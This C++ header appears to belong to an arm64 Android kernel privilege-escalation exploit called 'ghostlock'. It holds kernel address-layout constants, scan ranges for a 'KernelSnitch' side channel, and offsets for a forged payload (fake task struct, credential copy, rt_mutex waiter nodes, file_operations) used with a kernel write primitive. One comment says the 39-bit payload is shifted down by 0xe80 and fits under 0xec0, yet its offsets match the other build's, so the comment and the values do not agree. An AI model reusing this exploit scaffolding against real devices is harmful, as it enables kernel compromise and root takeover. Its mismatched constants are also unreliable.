#ifndef GHOSTLOCK_TARGET_CONSTANTS_HPP
#define GHOSTLOCK_TARGET_CONSTANTS_HPP

#include <cstddef>
#include <cstdint>
#include <limits>
#include <optional>
#include <type_traits>

namespace ghostlock::target {
#if defined(GHOSTLOCK_VA39)
    /* arm64 4.19 vendors (VA_BITS=39, 4KB pages).  The layout is inverted
 * relative to the 40-bit GKI constants: the image sits low at
 * KIMAGE_VADDR+TEXT_OFFSET and the linear map starts at 0xffffffc000000000.
 * Proof from the image itself: 77 `and x, x, #0x3fffffffff` sites (that mask
 * is ~PAGE_OFFSET) plus `ands #0x4000000000` (BIT(38) = BIT(VA_BITS-1)) in
 * __virt_to_phys inlines. Feeding a 39-bit kernel the 40-bit P0_PAGE_OFFSET
 * makes every direct-map target land 256 GiB low, so W1 writes into nothing
 * and KernelSnitch scans a range no mm_struct can occupy. */
    namespace address {
        inline constexpr std::uintptr_t kImageTextBase = 0xffffff8008080000ULL;
        inline constexpr std::uintptr_t kMtkVirtualBase = 0xffffffc000000000ULL;
        inline constexpr std::uintptr_t kPageOffset = 0xffffffc000000000ULL;
        inline constexpr std::uintptr_t kPhysicalOffset = 0x80000000ULL;
        inline constexpr std::uintptr_t kKernelSnitchIdentityStart =
                0xffffffc000000000ULL;
        inline constexpr std::uintptr_t kKernelSnitchIdentityEnd =
                0xffffffc200000000ULL;
        inline constexpr std::uintptr_t kDirectMapBase = 0xffffffc000000000ULL;
        inline constexpr std::uintptr_t kDirectMapEnd = 0xffffffc400000000ULL;
        inline constexpr std::uintptr_t kVmemmapStart = 0xfffffffe00000000ULL;
    } // namespace address
#else
    namespace address {
        inline constexpr std::uintptr_t kImageTextBase = 0xffffffc080000000ULL;
        inline constexpr std::uintptr_t kMtkVirtualBase = 0xffffffc000000000ULL;
        inline constexpr std::uintptr_t kPageOffset = 0xffffff8000000000ULL;
        inline constexpr std::uintptr_t kPhysicalOffset = 0x80000000ULL;
        inline constexpr std::uintptr_t kKernelSnitchIdentityStart =
                0xffffff8000000000ULL;
        inline constexpr std::uintptr_t kKernelSnitchIdentityEnd =
                0xffffff8c00000000ULL;
        inline constexpr std::uintptr_t kDirectMapBase = 0xffffff8000000000ULL;
        inline constexpr std::uintptr_t kDirectMapEnd = 0xffffff9000000000ULL;
        inline constexpr std::uintptr_t kVmemmapStart = 0xfffffffe00000000ULL;
    } // namespace address
#endif

    namespace payload {
#if defined(GHOSTLOCK_VA39)
        /* Repacked for the 4.19 skb linear area (0xec0 bytes, see
     * kernel/constants.hpp): every object is shifted down by 0xe80 so the
     * whole payload fits inside one 4 KiB head. Ordering and spacing are
     * unchanged, so the pointers the payload hands to the kernel keep the
     * same relationships. The fake task needs 0x8f0 bytes for pi_blocked_on
     * (0x8e8), ending at 0xcf0 - still under 0xec0. */
        inline constexpr std::size_t kLockOffset = 0x0e80;
        inline constexpr std::size_t kFileOperationsOffset = 0x0f80;
        inline constexpr std::size_t kCredentialCopyOffset = 0x1080;
        inline constexpr std::size_t kWaiterOffset = 0x1180;
        inline constexpr std::size_t kRightNodeOffset = 0x1240;
        inline constexpr std::size_t kLeftNodeOffset = 0x1260;
        inline constexpr std::size_t kFakeTaskOffset = 0x1280;
        inline constexpr std::size_t kTcpFakeTaskOffset = 0x5800;
        inline constexpr std::size_t kTcpCredentialCopyOffset = 0x6800;
#else
        inline constexpr std::size_t kLockOffset = 0x0e80;
        inline constexpr std::size_t kWaiterOffset = 0x1180;
        inline constexpr std::size_t kFileOperationsOffset = 0x0f80;
        inline constexpr std::size_t kRightNodeOffset = 0x1240;
        inline constexpr std::size_t kLeftNodeOffset = 0x1260;
        inline constexpr std::size_t kFakeTaskOffset = 0x1280;
        inline constexpr std::size_t kCredentialCopyOffset = 0x1080;
        inline constexpr std::size_t kTcpFakeTaskOffset = 0x5800;
        inline constexpr std::size_t kTcpCredentialCopyOffset = 0x6800;
#endif
    } // namespace payload

    template<typename Domain>
    class KernelAddress final {
    public:
        constexpr KernelAddress() noexcept = default;

        explicit constexpr KernelAddress(std::uintptr_t value) noexcept
            : value_(value) {
        }

        [[nodiscard]] constexpr std::uintptr_t value() const noexcept {
            return value_;
        }

        [[nodiscard]] constexpr std::optional<KernelAddress> checked_add(
            std::uintptr_t offset) const noexcept {
            if (offset > std::numeric_limits<std::uintptr_t>::max() - value_) {
                return std::nullopt;
            }
            return KernelAddress(value_ + offset);
        }

        friend constexpr bool operator==(KernelAddress, KernelAddress) = default;

    private:
        std::uintptr_t value_ = 0;
    };

    struct ImageAddressDomain final {
    };

    struct DirectMapAddressDomain final {
    };

    struct PhysicalAddressDomain final {
    };

    static_assert(std::is_standard_layout_v<KernelAddress<ImageAddressDomain> >);
    static_assert(std::is_trivially_copyable_v<KernelAddress<ImageAddressDomain> >);
    static_assert(sizeof(KernelAddress<ImageAddressDomain>) == sizeof(std::uintptr_t));
    static_assert(alignof(KernelAddress<ImageAddressDomain>) == alignof(std::uintptr_t));

#if !defined(GHOSTLOCK_VA39)
    static_assert(address::kImageTextBase == 0xffffffc080000000ULL);
#endif
    static_assert(address::kMtkVirtualBase == 0xffffffc000000000ULL);
    static_assert(address::kPageOffset == address::kDirectMapBase);
    static_assert(address::kKernelSnitchIdentityStart == address::kDirectMapBase);
    static_assert(address::kKernelSnitchIdentityEnd < address::kDirectMapEnd);
#if !defined(GHOSTLOCK_VA39)
    static_assert(payload::kLockOffset == 0x0e80);
    static_assert(payload::kFileOperationsOffset == 0x0f80);
    static_assert(payload::kCredentialCopyOffset == 0x1080);
    static_assert(payload::kWaiterOffset == 0x1180);
    static_assert(payload::kRightNodeOffset == 0x1240);
    static_assert(payload::kLeftNodeOffset == 0x1260);
    static_assert(payload::kFakeTaskOffset == 0x1280);
#endif
    static_assert(payload::kTcpFakeTaskOffset == 0x5800);
    static_assert(payload::kTcpCredentialCopyOffset == 0x6800);
} // namespace ghostlock::target

#endif
